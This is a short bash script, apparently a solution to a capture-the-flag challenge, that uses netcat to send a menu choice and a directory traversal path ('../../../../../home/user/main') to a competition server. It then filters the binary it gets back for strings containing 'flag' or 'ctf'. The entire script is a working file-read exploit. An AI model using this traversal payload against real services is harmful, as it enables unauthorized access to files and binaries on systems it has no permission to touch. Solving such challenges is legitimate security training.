#!/bin/bash

echo -e "2\n ../../../../../home/user/main" | nc -w 3 mngmnt-iface.ctfcompetition.com 1337|strings|grep -i -e flag -e ctf

